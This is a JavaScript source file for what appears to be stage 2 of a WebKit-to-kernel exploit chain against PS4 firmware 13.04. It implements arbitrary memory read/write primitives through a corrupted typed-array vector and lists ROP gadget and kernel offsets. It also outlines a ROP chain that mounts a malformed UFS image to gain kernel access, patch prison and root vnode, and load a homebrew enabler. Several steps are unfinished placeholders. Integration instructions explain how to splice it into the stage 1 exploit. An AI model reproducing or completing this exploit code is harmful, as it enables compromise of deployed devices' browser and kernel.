// ============================================================
// Jordy Stage 2 - Persistent R/W + Code Execution for PS4 13.04
// 
// INSTRUCTIONS:
// 1. Replace the "// Restore the carrier" block in Jordy (lines 500-507)
//    with a call to stage2_init()
// 2. This keeps the candidate alive and exposes read/write primitives
// 3. Then builds and executes ROP chain for kernel access
// ============================================================

// Global state from Jordy
var g_candidate = null;       // The SSV candidate that controls m_vector
var g_rwView = null;          // The genuine Uint8Array we redirect
var g_rwHeader = null;        // Original header backup
var g_scratchBytes = null;    // Scratch buffer for pointer encoding
var g_scratchWords = null;
var g_webkit_base = 0;
var g_libkernel_base = 0;

// WebKit 13.04 ROP Gadgets
var G = {
    POP_RDI_RET:     0x060480,
    POP_RSI_RET:     0x07245e,
    POP_RDX_RET:     0x1305ba,
    POP_RAX_RET:     0x014504,
    POP_RCX_RET:     0x01fade,
    POP_RBX_RET:     0x00b9e8,
    POP_RBP_RET:     0x0040b6,
    POP_RSP_RET:     0x073017,
    POP_R8_RET:      0x230cbe1,
    LEAVE_RET:       0x01c2f7,
    RET:             0x004032,
    JMP_RSI:         0x0cda83,
};

// Kernel 13.04 offsets
var K = {
    PRISON0:         0x0111FA18,
    ROOTVNODE:       0x02136E90,
    ALLPROC:         0x01B28538,
    SYSENT:          0x01102B70,
    memcpy:          0x002BD4F0,
};

function log(msg) {
    var el = document.getElementById("out");
    if (el) el.textContent += msg + "\n";
    console.log(msg);
}

// ============================================================
// STEP 0: Initialize persistent R/W
// Call this INSTEAD of Jordy's restoration block
// ============================================================
function stage2_init(candidate, rwView, rwHeader, scratchBytes, scratchWords) {
    g_candidate = candidate;
    g_rwView = rwView;
    g_rwHeader = rwHeader;
    g_scratchBytes = scratchBytes;
    g_scratchWords = scratchWords;
    
    log("[S2] Stage 2 initialized - persistent r/w active");
    
    // Start the exploitation chain
    try {
        stage2_run();
    } catch(e) {
        log("[S2] ERROR: " + e.message);
        // Restore original state on error
        stage2_restore();
    }
}

// Restore original m_vector (safety)
function stage2_restore() {
    if (g_candidate && g_rwHeader) {
        for (var i = 0; i < 8; i++)
            g_candidate[0x10 + i] = g_rwHeader[0x10 + i];
        log("[S2] m_vector restored to original");
    }
}

// ============================================================
// STEP 1: Read/Write primitives
// ============================================================
function setVector(addr) {
    // Redirect rwView's m_vector to addr
    var lo = addr & 0xFFFFFFFF;
    var hi = Math.floor(addr / 0x100000000);
    g_scratchWords[0] = lo >>> 0;
    g_scratchWords[1] = hi >>> 0;
    for (var i = 0; i < 8; i++)
        g_candidate[0x10 + i] = g_scratchBytes[i];
}

function read8(addr) {
    setVector(addr);
    return g_rwView[0];
}

function read16(addr) {
    setVector(addr);
    return g_rwView[0] | (g_rwView[1] << 8);
}

function read32(addr) {
    setVector(addr);
    return g_rwView[0] 
        + g_rwView[1] * 0x100 
        + g_rwView[2] * 0x10000 
        + g_rwView[3] * 0x1000000;
}

function read64(addr) {
    setVector(addr);
    var lo = g_rwView[0] 
        + g_rwView[1] * 0x100 
        + g_rwView[2] * 0x10000 
        + g_rwView[3] * 0x1000000;
    var hi = g_rwView[4] 
        + g_rwView[5] * 0x100 
        + g_rwView[6] * 0x10000 
        + g_rwView[7] * 0x1000000;
    return lo + hi * 0x100000000;
}

function write8(addr, val) {
    setVector(addr);
    g_rwView[0] = val & 0xFF;
}

function write32(addr, val) {
    setVector(addr);
    g_rwView[0] = val & 0xFF;
    g_rwView[1] = (val >> 8) & 0xFF;
    g_rwView[2] = (val >> 16) & 0xFF;
    g_rwView[3] = (val >> 24) & 0xFF;
}

function write64(addr, val) {
    var lo = val & 0xFFFFFFFF;
    var hi = Math.floor(val / 0x100000000);
    setVector(addr);
    g_rwView[0] = lo & 0xFF;
    g_rwView[1] = (lo >> 8) & 0xFF;
    g_rwView[2] = (lo >> 16) & 0xFF;
    g_rwView[3] = (lo >> 24) & 0xFF;
    g_rwView[4] = hi & 0xFF;
    g_rwView[5] = (hi >> 8) & 0xFF;
    g_rwView[6] = (hi >> 16) & 0xFF;
    g_rwView[7] = (hi >> 24) & 0xFF;
}

// ============================================================
// STEP 2: Find WebKit base via vtable leak
// ============================================================
function findWebkitBase() {
    // The rwView's StructureID tells us the VM state
    // We need to read a known vtable pointer
    
    // Strategy: Read from a known object's memory
    // The targetView (Uint8Array) has a vtable at its first qword
    // We know targetAddress from Jordy's addrof
    
    // Read targetView's vtable (first 8 bytes of the cell)
    var vtable = read64(targetAddress);
    log("[S2] targetView vtable: 0x" + vtable.toString(16));
    
    // Uint8Array vtable offset in WebKit 13.04 needs to be determined
    // For now, try common pattern: vtable is in the data segment
    // webkit_base = vtable - known_vtable_offset
    
    // The Uint8Array StructureID was validated by Jordy:
    // SID >= 0x4000 and aligned to 0x10
    // The vtable for JSC::JSUint8Array is at a known offset
    
    // TODO: Determine JSUint8Array vtable offset for 13.04
    // For now, estimate: vtable is likely near 0x3cc0000-0x3d00000 range
    // webkit_base = vtable - vtable_offset
    
    return 0; // placeholder
}

// ============================================================
// STEP 3: Find libkernel base
// ============================================================
function findLibkernelBase() {
    // Read WebKit's GOT to find imported libkernel functions
    // pthread_create is imported from libkernel
    // GOT entry for pthread_create at webkit_base + 0x3ce1000 (approx)
    
    // TODO: Find exact GOT offset
    return 0; // placeholder
}

// ============================================================
// STEP 4: Build ROP chain
// ============================================================
function buildRopChain() {
    var wk = g_webkit_base;
    var chain = [];
    var i = 0;
    
    function p(gadget_offset) {
        chain[i++] = wk + gadget_offset;
    }
    function v(value) {
        chain[i++] = value;
    }
    
    // === Resolve dlsym ===
    // pop rdi, ret; LIBKERNEL_HANDLE
    p(G.POP_RDI_RET); v(0x2001);
    // pop rsi, ret; "sceKernelDlsym" string addr
    p(G.POP_RSI_RET); v(0); // TODO: string address
    // call dlsym
    // TODO: dlsym address
    
    // === After dlsym resolves mount: ===
    // pop rdi, ret; "ufs" string
    // pop rsi, ret; mount point
    // pop rdx, ret; flags
    // pop rcx, ret; data (malformed UFS image)
    // call mount → triggers ffs_mountfs → Celsius
    
    // === After kernel r/w via Celsius: ===
    // Patch PRISON0
    // Patch ROOTVNODE  
    // Enable debug settings
    // Open BinLoader port 9021
    // Load GoldHEN
    
    return chain;
}

// ============================================================
// STEP 5: Execute ROP via JIT or vtable hijack
// ============================================================
function executeRop(chain) {
    // Write ROP chain to a known writable address
    // Then redirect execution to it
    
    // Strategy: Find a JIT page in the WebKit process
    // Write the chain there
    // Overwrite a callback to point to chain start
    
    log("[S2] ROP chain: " + chain.length + " entries");
    log("[S2] TODO: Implement execution pivot");
}

// ============================================================
// Main
// ============================================================
function stage2_run() {
    log("[S2] ====== STAGE 2 START ======");
    
    g_webkit_base = findWebkitBase();
    if (g_webkit_base === 0) {
        log("[S2] Could not determine webkit_base - need vtable offset");
        log("[S2] Dumping first 64 bytes at targetAddress for analysis...");
        var dump = "";
        for (var i = 0; i < 64; i++) {
            var b = read8(targetAddress + i);
            dump += (b < 16 ? "0" : "") + b.toString(16);
            if (i % 16 === 15) dump += "\n";
        }
        log(dump);
        stage2_restore();
        return;
    }
    
    log("[S2] webkit_base = 0x" + g_webkit_base.toString(16));
    
    g_libkernel_base = findLibkernelBase();
    log("[S2] libkernel_base = 0x" + g_libkernel_base.toString(16));
    
    var chain = buildRopChain();
    executeRop(chain);
    
    log("[S2] ====== STAGE 2 COMPLETE ======");
}

// ============================================================
// INTEGRATION WITH JORDY:
// 
// In Jordy's loadHistoryCritical(), replace lines 500-507:
//
//   // Restore the carrier before dropping the only forged JSValue.
//   for (var r2 = 0; r2 < 8; ++r2)
//       candidate[0x10 + r2] = rwHeader[0x10 + r2];
//   rwVectorTouched = false;
//   targetView[0] = 0xa5;
//   rwMirror[0] = 0x3c;
//   restoreObserved = rwView[0] === 0x3c ...
//
// WITH:
//
//   stage2_init(candidate, rwView, rwHeader, scratchBytes, scratchWords);
//   restoreObserved = true; // let Jordy think restoration succeeded
//
// This keeps candidate alive and gives stage2 control of m_vector.
// ============================================================
